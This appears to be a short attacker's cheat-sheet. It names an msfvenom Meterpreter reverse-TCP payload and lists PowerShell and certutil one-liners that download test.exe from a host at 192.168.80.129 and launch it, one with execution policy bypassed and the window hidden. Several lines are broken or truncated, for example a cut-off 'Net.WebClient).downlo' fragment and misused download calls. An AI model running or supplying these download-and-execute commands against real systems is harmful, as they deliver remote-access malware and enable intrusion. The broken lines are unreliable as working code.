New MSF Venom

-p windows/x64/meterpreter_reverse_tcp 

IEX(New-Object Net.WebClient).downloadString('http://192.168.80.129:8003/test.exe');Start-Process ("test.exe")

IEX (New-Object Net.WebClient).downloadFile('http://192.168.80.129:8003/test.exe');Start-Process ("test.exe")

powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command 

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.80.129:8003/test.exe',"$env:C:\tmp\$ProcName");Start-Process ("$env:APPDATA\test.exe")

Net.WebClient).downlo


certutil -urlcache -split -f http://192.168.80.129:8000/test.exe